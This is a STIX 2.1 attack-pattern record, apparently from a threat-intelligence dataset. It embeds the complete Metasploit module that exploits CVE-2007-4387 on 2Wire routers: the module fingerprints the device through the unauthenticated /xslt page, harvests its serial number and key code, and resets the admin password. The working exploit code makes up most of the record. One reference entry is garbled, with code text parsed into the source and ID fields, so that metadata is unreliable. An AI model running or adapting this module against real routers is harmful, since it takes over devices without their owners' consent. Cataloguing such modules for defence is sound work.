{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e38668c-83a3-478b-954f-8d90330027ed",
    "created": "2024-08-14T16:22:34.94662Z",
    "modified": "2024-08-14T16:22:34.946624Z",
    "name": "\"2Wire Cross-Site Request Forgery Password Reset Vulnerability\"",
    "description": " This module will reset the admin password on a 2Wire wireless router.  This is done by using the /xslt page where authentication is not required, thus allowing configuration changes (such as resetting the password) as administrators.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/2wire/xslt_password_reset.rb",
            "external_id": "xslt_password_reset.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4387"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2007/Aug/225"
        },
        {
            "source_name": "print_error(\"DidnotgetHTTP200",
            "external_id": "URLwasnotfound.Exiting!\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"2Wire Cross-Site Request Forgery Password Reset Vulnerability\",\n      'Description'    => %q{\n          This module will reset the admin password on a 2Wire wireless router.  This is\n        done by using the /xslt page where authentication is not required, thus allowing\n        configuration changes (such as resetting the password) as administrators.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hkm [at] hakim.ws',              #Initial discovery, poc\n          'Travis Phillips',  #Msf module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-4387' ],\n          [ 'OSVDB', '37667' ],\n          [ 'BID', '36075' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2007/Aug/225' ],\n        ],\n      'DisclosureDate' => '2007-08-15' ))\n\n      register_options(\n        [\n          OptString.new('PASSWORD', [ true, 'The password to reset to', 'admin'])\n        ])\n  end\n\n  def post_auth?\n    false\n  end\n\n  def run\n\n    print_status(\"Attempting to connect to http://#{rhost}/xslt?PAGE=A07 to gather information\")\n    res = send_request_raw(\n    {\n      'method'  => 'GET',\n      'uri'     => '/xslt?PAGE=A07',\n    }, 25)\n\n    if not res\n      print_error(\"No response from server\")\n      return\n    end\n\n    # check to see if we get HTTP OK\n    if (res.code == 200)\n      print_status(\"Okay, Got an HTTP 200 (okay) code. Verifying Server header\")\n    else\n      print_error(\"Did not get HTTP 200, URL was not found. Exiting!\")\n      return\n    end\n\n    # Check to verify server reported is a 2wire router\n    if (res.headers['Server'].match(/2wire Gateway/i))\n      print_status(\"Server is a 2wire Gateway! Grabbing info\\n\")\n    else\n      print_error(\"Target doesn't seem to be a 2wire router. Exiting!\")\n      return\n    end\n\n    print_status(\"---===[ Router Information ]===---\")\n\n    # Grabbing the Model Number\n    if res.body.match(/<td class=\"textmono\">(.*)<\\/td>/i)\n      model = $1\n      print_status(\"Model: #{model}\")\n    end\n\n    # Grabbing the serial Number\n    if res.body.match(/<td class=\"data\">(\\d{12})<\\/td>/i)\n      serial = $1\n      print_status(\"Serial: #{serial}\")\n    end\n\n    # Grabbing the Hardware Version\n    if res.body.match(/<td class=\"data\">(\\d{4}-\\d{6}-\\d{3})<\\/td>/i)\n      hardware = $1\n      print_status(\"Hardware Version: #{hardware}\")\n    end\n\n    # Check the Software Version\n    if res.body.match(/<td class=\"data\">(5\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})<\\/td>/i)\n      ver = $1\n      print_status(\"Software version: #{ver}\")\n    else\n      print_error(\"Target is not a version 5 router. Exiting!\")\n      return\n    end\n\n    # Grabbing the Key Code\n    if res.body.match(/<td class=\"data\">(\\w{4}-\\w{4}-\\w{4}-\\w{4}-\\w{4})<\\/td>/i)\n      key = $1\n      print_status(\"Key Code: #{key}\\n\")\n    end\n\n    print_status(\"Attempting to exploit Password Reset Vulnerability on #{rhost}\")\n    print_status(\"Connecting to http://#{rhost}/xslt?PAGE=H04 to make sure page exist.\")\n\n    res = send_request_raw(\n    {\n      'method'  => 'GET',\n      'uri'     => '/xslt?PAGE=H04',\n    }, 25)\n\n    if ( res and res.code == 200 and res.body.match(/<title>System Setup - Password<\\/title>/i))\n      print_status(\"Found password reset page. Attempting to reset admin password to #{datastore['PASSWORD']}\")\n\n      data  = 'PAGE=H04_POST'\n      data << '&THISPAGE=H04'\n      data << '&NEXTPAGE=A01'\n      data << '&PASSWORD=' + datastore['PASSWORD']\n      data << '&PASSWORD_CONF=' + datastore['PASSWORD']\n      data << '&HINT='\n\n      res = send_request_cgi(\n      {\n        'method'  => 'POST',\n        'uri'     => '/xslt',\n        'data'    => data,\n      }, 25)\n\n      if res and res.code == 200\n        cookies = res.get_cookies\n        if cookies && cookies.match(/(.*); path=\\//)\n          cookie= $1\n          print_good(\"Got cookie #{cookie}. Password reset was successful!\\n\")\n        end\n      end\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-08-15 "
}